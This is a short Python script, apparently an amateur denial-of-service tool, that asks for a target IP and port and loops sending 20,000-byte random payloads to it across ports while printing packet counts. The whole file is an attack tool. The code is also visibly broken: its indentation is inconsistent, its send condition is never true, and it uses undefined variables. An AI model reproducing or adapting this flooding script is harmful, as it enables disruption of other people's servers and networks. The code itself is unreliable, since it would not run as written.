import sys
import os
import time
import socket
import random

#storing the date and time.

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#display on  the operating screen

os.system("clear")
os.system("figlet DDoD")
victim=input("IP Target:")
vport=input("Port:")

os.system("clear")
os.system("figlet Initiating")

#defining the attack

client=socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
 bytes = random._urandom(20000)
sent = 3000
while True:
    if client == -1:
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        port = port + 1
     print ("Sent %s packet to %s through port: %s"%(sent,ip,port))
     if port == 65543:
         port = 1

os.system("clear")
os.system("figlet Alofted")


